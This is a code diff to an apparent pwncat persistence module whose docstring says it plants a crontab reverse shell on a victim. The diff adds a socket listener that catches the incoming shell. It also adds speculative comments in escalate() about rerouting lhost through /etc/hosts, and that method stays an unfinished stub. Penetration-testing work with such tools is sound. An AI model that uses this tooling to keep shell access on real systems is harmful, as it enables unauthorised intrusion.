@@ -4,6 +4,28 @@ from crontab import CronTab
 from pwncat.modules import Argument, Status, PersistType, PersistError
 from pwncat.modules.persist import PersistModule
 
+# For connect function, pulled from said function, thanks :)
+from colorama import Fore
+import ipaddress
+import os.path
+import socket
+import re
+
+import paramiko
+from prompt_toolkit import prompt
+from rich.progress import Progress, BarColumn
+
+import pwncat
+from pwncat.util import console
+from pwncat.commands.base import (
+    CommandDefinition,
+    Complete,
+    Parameter,
+    StoreForAction,
+    StoreConstOnce,
+)
+
+
 class Module(PersistModule):
     """ Install a reverse shell (executed by /bin/bash) in the current user's crontab """
     TYPE = PersistType.REMOTE
@@ -128,8 +150,35 @@ class Module(PersistModule):
     def escalate(self, user, lhost, lport, schedule, shell):
         """ Locally escalate privileges with this module """
 
+        # Not sure how implement this
+
+        # A few theories:
+        	# 1. if lhost is a domain and we have write privileges to /etc/hosts, then reroute lhost to 0.0.0.0 (victim's localhost) and open a socket on the victim to catch it
+        	# 2. I imagine there is something I am missing about the user variable that may be useful here...
+
         yield Status("Update the status information")
         return "exit command used to leave this new shell"
 
     def connect(self, user, lhost, lport, schedule, shell):
-        """ Connect to the victim at pwncat.victim.host.ip """
+        """ Pulled from connect.py, thank you :) """
+        with Progress(
+                f"bound to [blue]{lhost}[/blue]:[cyan]{lport}[/cyan]",
+                BarColumn(bar_width=None),
+                transient=True,
+            ) as progress:
+                task_id = progress.add_task("listening", total=1, start=False)
+                # Create the socket server
+                server = socket.create_server((lhost, lport), reuse_port=True)
+
+                try:
+                    # Wait for a connection
+                    (client, address) = server.accept()
+                except KeyboardInterrupt:
+                    progress.update(task_id, visible=False)
+                    progress.log("[red]aborting[/red] listener")
+                    return
+
+                progress.update(task_id, visible=False)
+                progress.log(
+                    f"[green]received[/green] connection from [blue]{address[0]}[/blue]:[cyan]{address[1]}[/cyan]"
+                )
